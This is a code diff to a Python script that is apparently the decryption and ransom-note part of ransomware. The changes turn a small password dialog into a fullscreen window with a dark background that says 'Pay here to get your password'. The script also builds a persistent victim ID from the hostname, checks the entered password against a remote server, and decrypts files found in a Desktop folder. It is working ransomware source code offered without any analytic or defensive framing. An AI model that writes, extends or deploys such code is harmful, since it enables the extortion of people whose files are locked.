@@ -1,8 +1,5 @@
-import os
-import sys
-import requests
-import tkinter as tk
-import platform
+import os, sys, requests, platform, uuid, webbrowser, tkinter as tk
+from tkinter import messagebox
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding, hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -40,36 +37,18 @@ def decrypt_directory(path: str, password: str):
     flag = os.path.join(path, ".encrypted_flag")
     if os.path.exists(flag): os.remove(flag)
 
-# ----- Tkinter password prompt -----
-def ask_for_password():
-    user_password = None
-    def on_submit():
-        nonlocal user_password
-        user_password = entry.get()
-        window.destroy()
-
-    window = tk.Tk()
-    window.title("Enter Decryption Password")
-    tk.Label(window, text="Enter Password:").pack(pady=10)
-    entry = tk.Entry(window, show="*"); entry.pack(pady=5)
-    tk.Button(window, text="Submit", command=on_submit).pack(pady=20)
-    window.mainloop()
-    return user_password
-
 # ----- Remote check -----
 def verify_password(user_id: str, password: str) -> bool:
     r = requests.post(SERVER_URL, json={"user_id": user_id, "password": password})
     r.raise_for_status()
     return r.json().get("valid", False)
 
-import os, platform, uuid
-
+# ----- User ID -----
 def get_or_create_user_id() -> str:
     id_file = os.path.expanduser("~/.user_id")
     if os.path.exists(id_file):
         return open(id_file).read().strip()
 
-    # Only generate once
     base = platform.node()
     unique_suffix = str(uuid.uuid4())
     user_id = f"{base}_{unique_suffix}"
@@ -79,9 +58,58 @@ def get_or_create_user_id() -> str:
 
     return user_id
 
+# ----- Tkinter GUI -----
+def password_window(user_id: str, target_folder: str):
+    def on_submit():
+        pw = entry.get()
+        if not pw:
+            msg_var.set("⚠️ Please enter a password.")
+            return
+
+        msg_var.set("🔍 Verifying password with server...")
+        window.update_idletasks()
+
+        if verify_password(user_id, pw):
+            decrypt_directory(target_folder, pw)
+            msg_var.set("✅ Password correct. Files decrypted successfully!")
+        else:
+            msg_var.set("❌ Invalid password. Try again.")
+
+    window = tk.Tk()
+    window.title("Decryption Tool")
+    window.attributes("-fullscreen", True)   # Full screen
+
+    frame = tk.Frame(window, bg="#1e1e1e")
+    frame.pack(expand=True, fill="both")
+
+    tk.Label(frame, text="🔐 Enter Decryption Password",
+             font=("Helvetica", 36, "bold"), fg="white", bg="#1e1e1e").pack(pady=60)
+
+    entry = tk.Entry(frame, show="*", font=("Helvetica", 28), width=30, justify="center")
+    entry.pack(pady=20)
+    entry.focus()
+
+    tk.Button(frame, text="Submit", command=on_submit,
+              font=("Helvetica", 24, "bold"), bg="#007acc", fg="white",
+              relief="flat", padx=30, pady=10).pack(pady=40)
+     
+    msg_var_pay = tk.StringVar(value="Pay here to get your password: ")
+    tk.Label(frame, textvariable=msg_var_pay, font=("Helvetica", 20),
+             fg="lightgray", bg="#1e1e1e").pack(pady=20)
+
+    msg_var = tk.StringVar(value="Please enter your password to unlock files.")
+    tk.Label(frame, textvariable=msg_var, font=("Helvetica", 20),
+             fg="lightgray", bg="#1e1e1e").pack(pady=20)
+
+    tk.Button(frame, text="Exit", command=window.destroy,
+              font=("Helvetica", 18), bg="red", fg="white",
+              relief="flat", padx=20, pady=5).pack(side="bottom", pady=40)
+
+    window.mainloop()
+
 # ----- Main -----
 if __name__ == "__main__":
-    user_id = get_or_create_user_id()  # or use same `get_or_create_user_id` logic
+    user_id = get_or_create_user_id()
     print(f"User ID: {user_id}")
 
     desktop = os.path.join(os.path.expanduser("~"), "Desktop")
@@ -94,15 +122,4 @@ if __name__ == "__main__":
         print("No encrypted files found.")
         sys.exit(1)
 
-    pw = ask_for_password()
-    if not pw:
-        print("No password entered.")
-        sys.exit(1)
-
-    print("Verifying password with server...")
-    if verify_password(user_id, pw):
-        decrypt_directory(target_folder, pw)
-        print("✅ Decryption complete.")
-    else:
-        print("❌ Invalid password.")
-        sys.exit(1)
+    password_window(user_id, target_folder)
